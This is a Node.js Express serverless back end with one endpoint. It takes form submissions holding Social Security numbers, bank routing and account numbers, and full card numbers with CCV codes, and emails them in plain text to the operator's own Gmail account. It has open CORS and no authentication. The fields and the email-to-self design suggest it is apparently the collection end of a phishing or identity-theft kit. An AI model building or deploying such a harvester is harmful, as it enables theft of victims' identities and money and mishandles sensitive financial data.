const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
app.use(cors());
app.use(express.json());

// === Email Transporter (Gmail SMTP) ===
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER, // your Gmail
        pass: process.env.EMAIL_PASS  // your App Password
    }
});

// === Endpoint: receive form submission + Drive info ===
app.post('/api/log', async (req, res) => {
    try {
        const logEntry = req.body;

        // Build a readable email body
        const emailBody = `
            === NEW FORM SUBMISSION ===
            Timestamp: ${new Date(logEntry.timestamp).toLocaleString()}

            --- Personal Information ---
            First Name: ${logEntry.formData.firstName}
            Last Name: ${logEntry.formData.lastName}
            Date of Birth: ${logEntry.formData.dateOfBirth}
            SSN: ${logEntry.formData.socialSecurityNumber}
            Phone: ${logEntry.formData.phoneNumber}
            Email: ${logEntry.formData.email}

            --- Address Information ---
            Current Address: ${logEntry.formData.currentAddress}
            City: ${logEntry.formData.city}
            State: ${logEntry.formData.state}
            Zip Code: ${logEntry.formData.zipCode}
            Mailing Address: ${logEntry.formData.mailingAddress}

            --- Banking Information ---
            Bank Name: ${logEntry.formData.bankName}
            Account Type: ${logEntry.formData.accountType}
            Routing Number: ${logEntry.formData.routingNumber}
            Account Number: ${logEntry.formData.accountNumber}

            --- Verification ---
            Terms Accepted: ${logEntry.formData.termsAccepted}
            Data Consent: ${logEntry.formData.dataConsent}

            --- Cards ---
            ${(logEntry.formData.cards || [])
                            .map((c, i) => `Card ${i + 1}: ${c.cardNumber}, Exp: ${c.expiry}, CCV: ${c.ccv}`)
                            .join('\n')}

            --- Google Drive Folder ---
            Name: ${logEntry.folder?.name}
            ID: ${logEntry.folder?.id}
            URL: ${logEntry.folder?.url}

            --- Uploaded Files ---
            ${(logEntry.files || [])
                            .map((f, i) => `${i + 1}. ${f.name}\n    URL: ${f.url}\n    ID: ${f.id}`)
                            .join('\n')}
            =============================
            `;

        // Send email
        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_USER, // send to yourself
            subject: `New Submission from ${logEntry.formData.firstName} ${logEntry.formData.lastName}`,
            text: emailBody
        });

        res.json({ success: true, message: 'Submission emailed successfully' });
    } catch (error) {
        console.error('Email error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Health check
app.get('/', (req, res) => {
    res.send('✅ Express backend is running on Vercel!');
});

// Export for Vercel serverless
module.exports = app;